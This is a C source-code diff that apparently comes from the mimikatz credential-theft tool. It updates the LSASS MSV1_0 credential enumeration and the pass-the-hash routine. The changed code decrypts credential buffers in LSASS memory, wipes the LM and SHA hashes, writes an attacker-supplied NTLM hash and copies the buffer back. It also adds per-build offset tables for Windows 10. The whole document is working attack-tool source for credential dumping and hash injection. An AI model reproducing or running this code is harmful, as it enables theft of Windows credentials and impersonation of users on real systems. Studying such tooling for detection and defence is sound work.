@@ -27,69 +27,50 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_std(IN PKUHL_M_SEKURLSA_CON
 	DWORD flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL;
 	kprintf(L"\n\t [%08x] %Z", AuthenticationPackageId, &pCredentials->Primary);
 	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
-		flags |= (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10)  ? KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY : KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10;
+		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
 	else if(RtlEqualString(&pCredentials->Primary, &CREDENTIALKEYS_STRING, FALSE))
 		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
-
 	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pCredentials->Credentials, (PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA) pOptionalData, flags);
 	return TRUE;
 }
 
 BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PKIWI_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
 {
-	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds = (PMSV1_0_PRIMARY_CREDENTIAL) (pCredentials->Credentials.Buffer);
-	PMSV1_0_PRIMARY_CREDENTIAL_10 pPrimaryCreds10 = (PMSV1_0_PRIMARY_CREDENTIAL_10) (pCredentials->Credentials.Buffer);
 	PMSV1_0_PTH_DATA_CRED pthDataCred = (PMSV1_0_PTH_DATA_CRED) pOptionalData;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalMemory = {pPrimaryCreds, &hLocalMemory};
+	PBYTE msvCredentials;
+	KULL_M_MEMORY_ADDRESS aLocalMemory = {pCredentials->Credentials.Buffer, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
+	const MSV1_0_PRIMARY_HELPER * helper = kuhl_m_sekurlsa_msv_helper(cLsass);
 
 	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
 	{
-		(*pthDataCred->pSecData->lsassLocalHelper->pLsaUnprotectMemory)(pCredentials->Credentials.Buffer, pCredentials->Credentials.Length);
-		if(cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10)
+		if(msvCredentials = (PBYTE) pCredentials->Credentials.Buffer)
 		{
+			(*pthDataCred->pSecData->lsassLocalHelper->pLsaUnprotectMemory)(msvCredentials, pCredentials->Credentials.Length);
+			*(PBOOLEAN) (msvCredentials + helper->offsetToisLmOwfPassword) = FALSE;
+			*(PBOOLEAN) (msvCredentials + helper->offsetToisShaOwPassword) = FALSE;
+			if(helper->offsetToisIso)
+				*(PBOOLEAN) (msvCredentials + helper->offsetToisIso) = FALSE;
+			RtlZeroMemory(msvCredentials + helper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH);
+			RtlZeroMemory(msvCredentials + helper->offsetToShaOwPassword, SHA_DIGEST_LENGTH);
 			if(pthDataCred->pthData->NtlmHash)
 			{
-				RtlCopyMemory(pPrimaryCreds->NtOwfPassword, pthDataCred->pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
-				pPrimaryCreds->isNtOwfPassword = TRUE;
+				*(PBOOLEAN) (msvCredentials + helper->offsetToisNtOwfPassword) = TRUE;
+				RtlCopyMemory(msvCredentials + helper->offsetToNtOwfPassword, pthDataCred->pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
 			}
 			else
 			{
-				RtlZeroMemory(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH);
-				pPrimaryCreds->isNtOwfPassword = FALSE;
+				*(PBOOLEAN) (msvCredentials + helper->offsetToisNtOwfPassword) = FALSE;
+				RtlZeroMemory(msvCredentials + helper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH);
 			}
-			RtlZeroMemory(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH);
-			RtlZeroMemory(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH);
-			pPrimaryCreds->isLmOwfPassword = FALSE;
-			pPrimaryCreds->isShaOwPassword = FALSE;
-		}
-		else
-		{
-			if(pthDataCred->pthData->NtlmHash)
-			{
-				RtlCopyMemory(pPrimaryCreds10->NtOwfPassword, pthDataCred->pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
-				pPrimaryCreds10->isNtOwfPassword = TRUE;
-			}
-			else
-			{
-				RtlZeroMemory(pPrimaryCreds10->NtOwfPassword, LM_NTLM_HASH_LENGTH);
-				pPrimaryCreds10->isNtOwfPassword = FALSE;
-			}
-			RtlZeroMemory(pPrimaryCreds10->LmOwfPassword, LM_NTLM_HASH_LENGTH);
-			RtlZeroMemory(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH);
-			pPrimaryCreds10->isIso = FALSE;
-			pPrimaryCreds10->isLmOwfPassword = FALSE;
-			pPrimaryCreds10->isShaOwPassword = FALSE;
-		}
-		(*pthDataCred->pSecData->lsassLocalHelper->pLsaProtectMemory)(pCredentials->Credentials.Buffer, pCredentials->Credentials.Length);
+			(*pthDataCred->pSecData->lsassLocalHelper->pLsaProtectMemory)(msvCredentials, pCredentials->Credentials.Length);
 
-		kprintf(L"data copy @ %p : ", origBufferAddress->address);
-		if(pthDataCred->pthData->isReplaceOk = kull_m_memory_copy(origBufferAddress, &aLocalMemory, pCredentials->Credentials.Length))
-			kprintf(L"OK !");
-		else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+			kprintf(L"data copy @ %p : ", origBufferAddress->address);
+			if(pthDataCred->pthData->isReplaceOk = kull_m_memory_copy(origBufferAddress, &aLocalMemory, pCredentials->Credentials.Length))
+				kprintf(L"OK !");
+			else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+		}
 	}
 	else kprintf(L".");
-
 	return TRUE;
 }
 
@@ -110,8 +91,7 @@ VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID 
 {
 	KIWI_MSV1_0_CREDENTIALS credentials;
 	KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {pCredentials, cLsass->hLsassMem};
+	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {pCredentials, cLsass->hLsassMem};
 
 	while(aLsassMemory.address)
 	{
@@ -140,4 +120,22 @@ VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID 
 			aLsassMemory.address = credentials.next;
 		} else kprintf(L"n.e. (KIWI_MSV1_0_CREDENTIALS KO)");
 	}
+}
+
+const MSV1_0_PRIMARY_HELPER msv1_0_primaryHelper[] = {
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, UserName), 0, FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, ShaOwPassword), 0},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, UserName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, ShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, align0)},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, UserName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, ShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword)},
+};
+
+const MSV1_0_PRIMARY_HELPER * kuhl_m_sekurlsa_msv_helper(PKUHL_M_SEKURLSA_CONTEXT context)
+{
+	const MSV1_0_PRIMARY_HELPER * helper;
+	if(context->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1507)
+		helper = &msv1_0_primaryHelper[0];
+	else if(context->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1511)
+		helper = &msv1_0_primaryHelper[1];
+	else
+		helper = &msv1_0_primaryHelper[2];
+	return helper;
 }
